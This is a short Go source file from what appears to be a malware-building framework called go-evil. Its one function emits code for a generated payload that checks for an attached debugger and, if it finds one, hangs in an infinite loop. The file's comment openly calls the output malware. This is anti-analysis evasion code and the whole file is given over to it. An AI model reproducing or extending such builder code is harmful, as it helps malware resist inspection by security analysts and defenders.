package debugger

import "github.com/TeamPhoneix/go-evil/utility/structure"

// Generates the code which will cause the malware to enter an infinite loop
func loop_behavior(s_json string) string {
	data_object := structure.Receive(s_json)
	body := []string{"func loop_behavior() bool {",
		"toReturn := false",
		"toReturn = detect_debugger()",
		"if toReturn {",
		"for {",
		"}}"}

	body = append(body, "return toReturn", "}")
	data_object.Add_go_function(body)

	return structure.Send(data_object)
}
